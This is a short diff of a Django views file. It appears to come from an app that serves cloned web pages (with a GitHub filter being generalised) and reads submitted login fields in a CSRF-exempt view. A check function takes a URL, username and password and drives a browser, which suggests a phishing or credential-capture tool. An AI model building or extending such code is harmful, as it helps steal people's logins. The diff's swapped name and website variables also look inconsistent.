@@ -32,7 +32,7 @@ def check(url,username,password,page):
     return browser.page_source
 @csrf_exempt
 def ViewPage(request,website):
-    request.domain=Website.objects.filter(name__contains='github')[1]
+    request.domain=Website.objects.filter(name__contains=website)[1]
     if request.method=='POST':
         print(request.POST)
         username=request.POST['login']
@@ -76,9 +76,9 @@ def new(request):
         data =data.replace('&#39;','\'')
         data =data.replace('&quot;','"')
         data =data.replace('&amp;','&')
-        nap=Page(name=name,code=data)
+        nap=Page(name=website,code=data)
         nap.save()
-        new_website=Website.objects.filter(name=website)
+        new_website=Website.objects.filter(name=name)
         if new_website:
             pass
         else:
